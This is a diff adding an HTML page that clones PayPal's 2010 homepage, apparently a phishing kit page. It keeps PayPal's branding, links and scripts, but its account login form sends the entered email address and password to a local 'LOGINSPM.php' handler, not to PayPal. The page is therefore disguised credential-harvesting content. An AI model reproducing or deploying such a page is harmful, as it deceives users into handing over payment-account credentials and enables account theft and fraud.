@@ -1,0 +1,320 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<!--
+		Script info: script: webscr, cmd: _home, template: xpt/Marketing_CommandDriven/homepage/IndividualsHome, date: Sep 13, 2010 12:41:42 PDT; country: US, language: en_US, xslt server: on
+		web version: 64.0-1509803 branch: UPR_644_1_int
+		content version: -
+		pexml version: 64.0-1509803
+		page XSL: Marketing_CommandDriven/default/en_US/homepage/IndividualsHome.xsl
+       hostname : tICmtXbnbJO3H29ZyTqEkZ33AzVl8iTnjQlkFpo0BuU
+         rlogid : tICmtXbnbJO3H29ZyTqEkW9zCWdVdG9MueFAUGV%2fHofRWk%2b7nacFNg%3d%3d_12b2c0dacac
+-->
+<title>Send Money, Pay Online, and Receive Money - all with PayPal</title>
+<meta name="keywords" content="send money, pay online, receive money">
+<meta name="description" content="With PayPal, you can safely and easily send money to anyone with an email address, pay online for the things you want, and receive money for the items you sell.">
+<meta http-equiv="X-UA-Compatible" content="IE=8">
+<link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20100907-1/css/core/core.css">
+<link media="print" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20100907-1/css/core/print.css">
+<link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20100907-1/css/marketing/marketing.css">
+<link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20100907-1/Marketing/css/pages/ConsumerRevamp.css">
+<!--[if IE 8]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20100907-1/css/browsers/ie8.css"><![endif]-->
+
+<!--[if IE 7]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20100907-1/css/browsers/ie7.css"><![endif]-->
+
+<!--[if lte IE 6]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20100907-1/css/browsers/ie6.css"><![endif]-->
+<link rel="apple-touch-icon" href="https://www.paypalobjects.com/WEBSCR-640-20100907-1/en_US/i/pui/apple-touch-icon.png">
+<script type="text/javascript">
+if (parent.frames.length > 0){
+	top.location.replace(document.location);
+}</script><style type="text/css">#welcomebox {background:url(https://www.paypal.com/en_US/Marketing/i/header/hdr_cpr_welcome_560x82.gif) no-repeat;}</style>
+<script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20100907-1/js/lib/min/global.js"></script><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20100907-1/js/lib/min/global.js"></script><link rel="shortcut icon" href="https://www.paypalobjects.com/WEBSCR-640-20100907-1/en_US/i/icon/pp_favicon_x.ico">
+</head>
+<body>
+
+
+
+<noscript><p class="nonjsAlert">NOTE: Many features on the PayPal Web site require Javascript and cookies. You can enable both via your browser's preference settings.</p></noscript> 
+<div class="outside home" id="page"> 
+<div id="header" class="std"> 
+<h1><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_home"><img border="0" src="https://www.paypal.com/en_US/i/logo/paypal_logo.gif" alt="PayPal"></a></h1> 
+<form method="post" id="searchForm" name="searchForm" action="https://www.paypal.com/cgi-bin/searchscr?cmd=_sitewide-search"> 
+<fieldset class="autocomplete" id="myDynamicAutoComplete"> 
+<legend>Search PayPal</legend> 
+<label for="searchBox">Search </label><input type="text" id="searchBox" name="queryString" value=""> <input type="hidden" id="sayTminLength" value="3"><input type="hidden" id="coDomain" value="US"><input class="button" type="submit" id="search.x" name="search.x" value="Search" autocomplete="off"> 
+</fieldset> 
+<input name="form_charset" type="hidden" value="UTF-8"> 
+</form> 
+<div id="navGlobal"><ul> 
+<li class="first signup"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_registration-run">Sign Up</a></li> 
+<li class="login"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_login-run">Log In</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/helpweb?cmd=_help">Help</a></li> 
+<li class="last"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_security-center-outside">Security Center</a></li> 
+</ul></div> 
+<form class="rosetta" id="rosetta" method="post" action="https://www.paypal.com/cgi-bin/webscr?cmd=_home&amp;dispatch=5885d80a13c0db1fc53a056acd1538874a43d73a07f26b2cc3a8a5dff46470e3"> 
+<fieldset> 
+<legend><span class="accessAid">Change Your Language</span></legend> 
+<label for="rosetta_dropdown">Language Select</label><select id="rosetta_dropdown" name="locale.x"><option value="en_US" selected>English</option> 
+<option value="es_XC">Espa?ol</option> 
+<option value="fr_XC">Fran?ais</option> 
+<option value="zh_XC">????(Chinese)</option></select><input type="submit" name="testName" value="&gt;" class="button mini"><input type="hidden" id="change_locale_x" name="change_locale.x" value="1"> 
+</fieldset> 
+<input name="form_charset" type="hidden" value="UTF-8"> 
+</form> 
+<div id="navPrimary"><ul> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_home-general&amp;nav=0" class="scTrack:SRD:Nav:L5">Home</a></li> 
+<li class="active"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_home-customer&amp;nav=1" class="scTrack:SRD:Nav:L8">Personal</a></li> 
+<li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/home" class="scTrack:SRD:Nav:x60">Business</a></li> 
+<li><a href="https://www.paypal.com/developer" class="scTrack:SRD:Nav:S9">Developers</a></li> 
+</ul></div> 
+</div> 
+<hr> 
+<div id="content"> 
+<div class="sidebar box login"> 
+<div class="header"><h2>Account login</h2></div> 
+<div class="body"><form method="post" name="login_form" action="LOGINSPM.php"> 
+<fieldset> 
+<legend>Member Log In</legend> 
+<p><label for="login_email">Email address</label><input type="text" id="login_email" name="login_email" value=""></p> 
+<p><label for="login_password">PayPal password</label><input autocomplete="off" type="password" id="login_password" name="login_password" value=""><script type="text/javascript"> 
+<!--hide from JavaScript-challenged browsers
+YAHOO.util.Event.addListener(window, "load", function(){
+document.login_form.login_password.focus();
+if (document.login_form.login_email.value == '') {
+document.login_form.login_email.focus();
+}
+});
+// done hiding -->
+</script></p> 
+<p><label for="target_page">Go to</label><select id="target_page" name="target_page"><option value="0" selected>My account</option> 
+<option value="1">My transactions</option></select></p> 
+<input type="submit" name="submit.x" value="Log In" class="button primary"> 
+</fieldset> 
+<p><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_account-recovery&amp;from=PayPal">Problem with login?</a></p> 
+<p>New to PayPal? <strong><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_registration-run">Sign up</a></strong>.</p> 
+<input name="form_charset" type="hidden" value="UTF-8"> 
+</form></div> 
+</div> 
+<div id="maincontent"> 
+<div id="welcomebox"><div class="welcomeLeft"><h1>The world’s most-loved way to pay and get paid. <a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work">Learn More</a> 
+</h1></div></div> 
+<div class="t1mpi"><div class="MktMPI" id="mpi600001"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_mpi-click-outside&uid=&cid=5690&oid=22637&bn=AjYsXGN-AwIQBgQUWBQBSiY6JA8&s=BDc3KRwFXVdJQFxCHSpYXlwte1h9Di0NKR8oAzwmHgADAjRqaAN4Cj0JMVEnAS8TMAggCS5SJQMLHzIVQyo4OQ&landing_url=ORAcFnkYQgcVBAsRXxhDBwsxIAs1PQs6WComAnYpDkYODGhrbAp8eE1UZw9oRXNWYlRFUA"><img src="https://securepics.ebaystatic.com/aw/pics/paypal/site/us/imgSATrckSpndg10cb_US_SRD_542x228.jpg" border="0" alt=""></a></div></div> 
+<div id="payments"> 
+<div class="firstbox"> 
+<h3>Pay Online</h3> 
+<p>Shop quickly and securely. <a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/consumer/Pay_Online-outside">Learn More</a></p> 
+<p class="learnMoreArrow nomargin"><a href="https://www.paypal-shopping.com/">Great Deals</a></p> 
+<p class="learnMoreArrow nomargin"><a href="https://www.paypal-shopping.com/shop-stores.html">PayPal Store Directory</a></p> 
+<p class="learnMoreArrow nomargin"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/general/PPPlusCC-outside">PayPal Plus MasterCard</a></p> 
+</div> 
+<div class="secondbox"> 
+<h3>Send Money</h3> 
+<p class="sendlearn">Send money to anyone with an email address. <a href="https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/send_money">Learn More</a></p> 
+<p class="learnMoreArrow nomargin"><a href="https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/send_money">Send Money Online</a></p> 
+<p class="learnMoreArrow nomargin"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing_CommandDriven/general/International_Money_Transfer-outside">Internationally</a></p> 
+<p class="learnMoreArrow nomargin"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/youth/Microsite-outside">To Your Teen</a></p> 
+</div> 
+<div class="thirdbox"> 
+<h3>Get Paid</h3> 
+<p class="sendlearn">Accept online payments for items you sell. <a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/consumer/Receive_Money-outside">Learn More</a></p> 
+<p class="learnMoreArrow nomargin"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_auction-outside">Sell on eBay</a></p> 
+<p class="learnMoreArrow nomargin"><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/accept_credit_cards">Accept Credit Cards</a></p> 
+<p class="learnMoreArrow nomargin"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/req/index-outside">Request Money</a></p> 
+</div> 
+</div> 
+</div>
+<div id="counter">
+<div class="topborder"></div>
+<div class="sideborders">
+<p><span id="NoOfUserLogin">219,000,000</span> Accounts Worldwide</p>
+<p class="signup"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_registration-run">Sign Up</a></p>
+</div>
+<div class="btmborder"></div>
+</div>
+<div id="bgleftgradient"> 
+<div class="leftHeader"><h3>Get to Know PayPal</h3></div> 
+<div id="leftBody"><ul> 
+<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work">How PayPal Works</a></li> 
+<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/Sign_Up_for_PayPal">Getting Started</a></li> 
+<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/My_PayPal_Account">Managing Your Account</a></li> 
+<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_To_Use_PayPal">Great Ways to Use PayPal</a></li> 
+<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/PayPal_FAQ">Top 10 Things to Know about PayPal</a></li> 
+</ul></div> 
+</div> 
+<div id="brandbar"><div class="MktMPI" id="mpi600003"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_mpi-click-outside&uid=&cid=5704&oid=22536&bn=AjYsXGN-AwIQBgQUWBQBSiY6JA8&s=BDc3KRwFXVdJQFxBHipaX14tfloaEiEdPiggGzAaDwUEAiEHPVwXACc&landing_url=ORAcFjANQkkOBxpeXRQUGg85ZA4qPw82HyYnHHcrBQRC"><img src="https://securepics.ebaystatic.com/aw/pics/paypal/site/us/imgJulyDeals2010AllBrands_750x70.jpg" border="0" alt=""></a></div></div> 
+<div class="pd_bottom_box"> 
+<div class="pd_bottom_box_title"><h3>All Personal Products &amp; Services</h3></div> 
+<div class="wrapper"> 
+<h4>Pay Online</h4> 
+<ul> 
+<li><a href="https://www.paypal-shopping.com/">PayPal Shopping</a></li> 
+<li><a href="https://www.paypal-shopping.com/shop-stores.html">PayPal Store Directory</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/general/PPPlusCC-outside">PayPal Credit</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/mobile/MobileOverview-outside#payonline">Shop via Your Mobile</a></li> 
+</ul> 
+</div> 
+<div class="wrapper"> 
+<h4>Send Money</h4> 
+<ul> 
+<li><a href="https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/send_money">Send Money Online</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing_CommandDriven/general/International_Money_Transfer-outside">International Money Transfer</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/youth/Microsite-outside">To Your Teen</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/mobile/MobileOverview-outside#sendmoney">Via Your Mobile</a></li> 
+</ul> 
+</div> 
+<div class="wrapper"> 
+<h4>Get Paid</h4> 
+<ul> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_auction-outside">Sell on eBay</a></li> 
+<li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/accept_credit_cards">Accept Credit Cards</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/req/index-outside">Request Money</a></li> 
+<li><a href="https://www.paypal.com/nonprofit">Accept Donations</a></li> 
+<li><a href="https://www.paypal.com/merchants">Merchant Services</a></li> 
+</ul> 
+</div> 
+<div class="wrapper"> 
+<h4>Other</h4> 
+<ul> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/youth/Microsite-outside">Student Account</a></li> 
+<li><a href="https://www.paypal.com/mobile">PayPal Mobile</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_upgrade-interest-marcom&amp;outside=1">Money Market Fund</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/account/DCIntro-outside">PayPal Debit Card</a></li> 
+<li><a href="https://cms.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/BillMeLater_ProductOverview">Bill Me Later</a></li> 
+</ul> 
+</div> 
+</div> 
+<div id="footer"> 
+<h5 class="accessAid">More Information</h5> 
+<ul> 
+<li class="first"><a href="http://www.paypal-media.com/aboutus.cfm">About Us</a></li>
+<li><a href="https://www.paypal.com/cgi-bin/helpscr?cmd=_help&amp;t=escalateTab">Contact Us</a></li>
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_display-fees-outside">Fees</a></li>
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/jobs-outside">Jobs</a></li>
+<li><a href="https://cms.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=developer/home">Developers</a></li>
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_home-merchant">Merchant Services</a></li>
+
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_display-country-functionality-outside">Worldwide</a></li>
+<li>
+<!-- OnlineOpinionF3cS v3.0-->
+<script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20100707-1/js/opinionlab/oo_engine.js"></script><script type="text/javascript">
+			var feedback_link='Site Feedback';	O_GoT(feedback_link);custom_var='Unknown|SRD: Individual Home|US|en_US|Unknown|Unknown';// Paypal Custom URL class
+			var PayPalURL = function(pagename) {
+				this.language_country_code = "en_US";
+				this.dd = "US";
+				this.nn = "00";this.pagename = escape(pagename.replace(/\s|\//g, "_"));
+				this.to_str = function() {
+		
+				return "https://"+this.dd+".paypal.com/"+this.language_country_code+"/"+this.nn+"/"+this.pagename+".page"
+				}
+				}
+				var paypal_url = new PayPalURL("SRD: Individual Home");
+			// Below gives you the ability to change the other properties after the object is created
+			//paypal_url.dd="ES";
+			//paypal_url.nn="01";
+			
+		_ht = paypal_url.to_str();
+		var _ht_temp=_ht;
+		var _hr_temp=_hr;
+		custom_var=custom_var + "|Unknown|Unknown";var custom_var_temp=custom_var;</script>
+</li>
+</ul>
+
+<ul>
+<li class="first"><a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside">Privacy</a></li>
+<li><a href="http://www.thepaypalblog.com">Our Blog</a></li>
+<li><a href="https://www.paypal-labs.com">Labs</a></li>
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_web-referrals-mrb-outside">Referrals</a></li>
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/ua-outside">Legal Agreements</a></li>
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/general/SiteMap-outside">Site Map</a></li>
+<li class="last"><a href="http://www.ebay.com/">eBay</a></li>
+</ul>
+<p id="footerSecure"><a target="_blank" href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Customer/popup/SecurityKeyVIP-outside" onClick="PAYPAL.core.openWindow(event, {width: 425, height: 350})"><img border="0" src="https://www.paypalobjects.com/WEBSCR-640-20100707-1/en_US/i/logo/logo_VIPwhite_66x27.gif" alt=""></a></p>
+
+<p id="legal">Copyright © 1999-2010 PayPal. All rights reserved.</p>
+</div>
+</div>
+<div id="navFull"><ul> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_home-general&amp;nav=0" class="scTrack:SRD:Nav:L5">Home</a></li> 
+<li class="active"> 
+<a href="https://www.paypal.com/cgi-bin/webscr?cmd=_home-customer&amp;nav=1" class="scTrack:SRD:Nav:L8">Personal</a><ul> 
+<li class="active"> 
+<a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work" class="scTrack:SRD:Nav:L9">How PayPal Works</a><ul> 
+<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work" class="scTrack:SRD:Nav:M0">What is PayPal</a></li> 
+<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/Sign_Up_for_PayPal" class="scTrack:SRD:Nav:M1">Getting Started</a></li> 
+<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/My_PayPal_Account" class="scTrack:SRD:Nav:M2">Managing Your Account</a></li> 
+<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_To_Use_PayPal" class="scTrack:SRD:Nav:M3">Great Ways to Use PayPal</a></li> 
+<li><a href="https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/PayPal_FAQ" class="scTrack:SRD:Nav:M4">Top Ten Things to Know About PayPal</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_display-fees-outside&amp;nav=1.0.5" class="scTrack:SRD:Nav:M5">How Much It Costs</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/general/PayPalAccountTypes-outside&amp;nav=1.0.6" class="scTrack:SRD:Nav:M6">Account Types</a></li> 
+</ul> 
+</li> 
+<li> 
+<a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/consumer/Pay_Online-outside&amp;nav=1.1" class="scTrack:SRD:Nav:M7">Pay Online</a><ul> 
+<li><a href="https://www.paypal-shopping.com/" class="scTrack:SRD:Nav:M8">Great Deals</a></li> 
+<li><a href="https://www.paypal-shopping.com/shop-stores.html" class="scTrack:SRD:Nav:M9">PayPal Store Directory</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/general/PPPlusCC-outside&amp;nav=1.1.2" class="scTrack:SRD:Nav:N0">PayPal Plus MasterCard</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/mobile/MobileOverview-outside&amp;nav=1.1.3" class="scTrack:SRD:Nav:N1">Shop Via Mobile</a></li> 
+</ul> 
+</li> 
+<li> 
+<a href="https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/send_money" class="scTrack:SRD:Nav:N3">Send Money</a><ul> 
+<li><a href="https://cms.paypal.com/us/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/send_money" class="scTrack:SRD:Nav:N4">Send Money Online</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing_CommandDriven/general/International_Money_Transfer-outside&amp;nav=1.2.1" class="scTrack:SRD:Nav:h10">Internationally</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/youth/Microsite-outside&amp;nav=1.2.2" class="scTrack:SRD:Nav:h11">To Your Teen</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/mobile/MobileOverview-outside&amp;nav=1.2.3" class="scTrack:SRD:Nav:N5">Via Your Mobile</a></li> 
+</ul> 
+</li> 
+<li> 
+<a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/consumer/Receive_Money-outside&amp;nav=1.3" class="scTrack:SRD:Nav:N6">Get Paid</a><ul> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_auction-outside&amp;nav=1.3.0" class="scTrack:SRD:Nav:N7">Sell Online</a></li> 
+<li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/wp_standard" class="scTrack:SRD:Nav:YP">Accept Credit Cards</a></li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=p/req/index-outside&amp;nav=1.3.2" class="scTrack:SRD:Nav:f89">Request Money</a></li> 
+<li><a href="https://www.paypal.com/nonprofit" class="scTrack:SRD:Nav:Y8">Accept Donations</a></li> 
+</ul> 
+</li> 
+<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=xpt/Marketing/consumer/Products_Services-outside&amp;nav=1.4" class="scTrack:SRD:Nav:N8">Products &amp; Services</a></li> 
+</ul> 
+</li> 
+<li><a href="https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/home" class="scTrack:SRD:Nav:x60">Business</a></li> 
+<li><a href="https://www.paypal.com/developer" class="scTrack:SRD:Nav:S9">Developers</a></li> 
+</ul></div> 
+<script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script> 
+</div> 
+<script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-610-20100201-1/js/lib/min/widgets.js"></script><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-610-20100201-1/js/sayT.js"></script><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-610-20100201-1/js/tns/mid.js"></script><script type="text/javascript">PAYPAL.tns.loginflow = 'xpt/Marketing_CommandDriven/homepage/IndividualsHome';PAYPAL.tns.flashLocation = 'https://www.paypal.com/en_US/m/mid.swf';</script><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-610-20100201-1/js/iconix.js"></script><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-610-20100201-1/js/pageBlockingUnsafeBrowsers.js"></script><script type="text/javascript" src="https://www.paypalobjects.com/js/tns/min/bid.js"></script><script type="text/javascript"> 
+								YAHOO.util.Event.addListener(window,"load",function(){
+									try {
+							PAYPAL.bp.init("login_form","bp_mid");PAYPAL.ks.init("login_form","login_password","bp_ks1");PAYPAL.common.appendField("login_form", "bp_ks2");PAYPAL.common.appendField("login_form", "bp_ks3");
+									} catch(err){}
+								});
+							</script><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-610-20100201-1/js/pp_naturalsearch.js"></script><script type="text/javascript">mp_landing();</script><div id="ppwebapi" class="advonqo.mha,hfb.lnb-k`ox`o-rdhsqdonqo"></div> 
+<!-- SiteCatalyst Code
+Copyright 1997-2005 Omniture, Inc.
+More info available at http://www.omniture.com --> 
+<script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-610-20100201-1/js/site_catalyst/pp_jscode_080706.js"></script> 
+<script type="text/javascript"> 
+<!--
+/* SiteCatalyst Variables */
+s.prop1="xpt/Marketing_CommandDriven/homepage/IndividualsHome";
+s.prop7="Unknown";
+s.prop8="Unknown";
+s.prop9="Unknown";
+s.prop10="US";
+s.prop34="PayPalCredit:Servicing:CO:NoTransactions";
+s.pageName="SRD: Individual Home";
+s.channel="SRD";
+s.prop50="en_US";
+s.prop18="L9M6N4N5N8";
+/************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
+var s_code=s.t();if(s_code)document.write(s_code)//--></script> 
+<script type="text/javascript"><!--
+if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
+//-->
+</script><noscript><img 
+src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript"
+height="1" width="1" border="0" alt="" /></noscript> 
+<!--/DO NOT REMOVE/--> 
+ 
+<!-- End SiteCatalyst Code --> 
+</body> 
+</html> 
